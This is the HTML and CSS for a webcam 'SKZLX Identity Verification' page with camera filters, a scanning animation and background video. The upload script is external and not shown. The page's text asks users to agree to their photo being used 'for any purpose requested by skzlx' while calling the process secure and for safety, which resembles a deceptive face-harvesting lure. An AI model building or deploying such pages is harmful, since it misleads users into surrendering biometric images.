    <style>
        /* SKZLX */
        #bg-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: -999;
            pointer-events: none;
        }

        /* SKZLX */
        body { 
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            margin: 0; 
            background-color: #121212; 
            color: #ffffff; 
            overflow-x: hidden;
        }

        /* SKZLX */
        .container { 
            position: relative;
            overflow: hidden;
            text-align: center; 
            background: rgba(30, 30, 30, 0.88); 
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            padding: 25px; 
            border-radius: 12px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.7); 
            width: 90%;
            max-width: 420px;
            box-sizing: border-box;
            margin: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #007bff, #00ffcc, #7928ca, #007bff);
            background-size: 300% 300%;
            animation: gradientBorder 6s ease infinite;
        }

        @keyframes gradientBorder {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* SKZLX */
        .webcam-wrapper {
            position: relative;
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.15);
            margin-bottom: 15px;
            background: #000;
            box-sizing: border-box;
        }

        /* SKZLX */
        video#webcam { 
            width: 100%; 
            max-width: 100%; 
            height: auto;
            display: block;
            border-radius: 6px; 
            transform: scaleX(-1);
            -webkit-transform: scaleX(-1);
            transition: filter 0.2s ease;
        }

        .scanner-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, transparent, #00ffcc, #007bff, transparent);
            box-shadow: 0 0 15px #00ffcc, 0 0 8px #007bff;
            animation: scanAnim 2.5s ease-in-out infinite;
            z-index: 5;
            pointer-events: none;
        }

        @keyframes scanAnim {
            0% { top: 0%; opacity: 0.8; }
            50% { top: 95%; opacity: 1; }
            100% { top: 0%; opacity: 0.8; }
        }

        /* SKZLX */
        .filter-container {
            margin-bottom: 15px;
            text-align: left;
        }

        .filter-container label {
            font-size: 12px;
            font-weight: bold;
            color: #aaaaaa;
            display: block;
            margin-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        select#filterSelect {
            width: 100%;
            padding: 10px;
            background: #1e1e1e;
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 6px;
            font-size: 14px;
            outline: none;
            cursor: pointer;
        }

        select#filterSelect:focus {
            border-color: #007bff;
        }

        button { 
            width: 100%;
            padding: 15px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            background-color: #007bff; 
            color: white; 
            border: none; 
            border-radius: 6px; 
            transition: background-color 0.2s; 
        }

        button:hover { 
            background-color: #0056b3; 
        }

        #status { 
            margin-top: 15px; 
            font-weight: bold; 
            font-size: 14px; 
            word-break: break-word;
        }

        /* SKZLX */
        .glitch-success {
            animation: glitchPulse 0.5s ease-in-out;
            border-color: #00cc66 !important;
            box-shadow: 0 0 25px rgba(0, 204, 102, 0.6) !important;
        }

        @keyframes glitchPulse {
            0% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); filter: hue-rotate(90deg); }
            40% { transform: translate(3px, -3px); }
            60% { transform: translate(-2px, -2px); filter: hue-rotate(180deg); }
            80% { transform: translate(2px, 1px); }
            100% { transform: translate(0); filter: none; }
        }

<body>
    <!-- SKZLX -->
    <video autoplay muted loop playsinline id="bg-video">
        <source src="video.mp4" type="video/mp4">
    </video>

    <div class="container" id="mainContainer">
        <h2>SKZLX Identity Verification</h2>
        <p>Please allow camera access. Position your face clearly in the frame. By pressing 'Verify Identity', you agree to upload your photo to be reviewed for any purpose requested by skzlx. This process is secure and used entirely for safety.</p>
        
        <!-- SKZLX -->
        <div class="webcam-wrapper">
            <div class="scanner-line" id="scannerLine"></div>
            <video id="webcam" autoplay playsinline></video>
        </div>

        <!-- SKZLX -->
        <div class="filter-container">
            <label for="filterSelect">Camera Filter</label>
            <select id="filterSelect">
                <option value="none">Normal</option>
                <option value="grayscale(100%) contrast(1.2)">Black & White</option>
                <option value="hue-rotate(90deg) contrast(1.4) saturate(2)">Cyber Matrix</option>
                <option value="invert(100%) hue-rotate(180deg)">Cyberpunk Neon</option>
                <option value="sepia(100%) contrast(1.1)">Vintage Sepia</option>
                <option value="hue-rotate(280deg) saturate(4) contrast(1.3)">Night Vision</option>
            </select>
        </div>

        <canvas id="canvas" style="display:none;"></canvas>
        
        <button id="captureBtn">Verify Identity</button>
        <p id="status"></p>
    </div>

    <!-- SKZLX -->
    <script src="script.js"></script>
    <script>
        const bgVideo = document.getElementById('bg-video');

        // SKZLX
        const unlockAudio = () => {
            if (bgVideo) {
                bgVideo.muted = false;
                bgVideo.play().catch(err => console.log("Audio unlock error:", err));
            }
            // SKZLX
            window.removeEventListener('click', unlockAudio);
            window.removeEventListener('touchstart', unlockAudio);
            window.removeEventListener('keydown', unlockAudio);
        };

        window.addEventListener('click', unlockAudio);
        window.addEventListener('touchstart', unlockAudio);
        window.addEventListener('keydown', unlockAudio);
    </script>
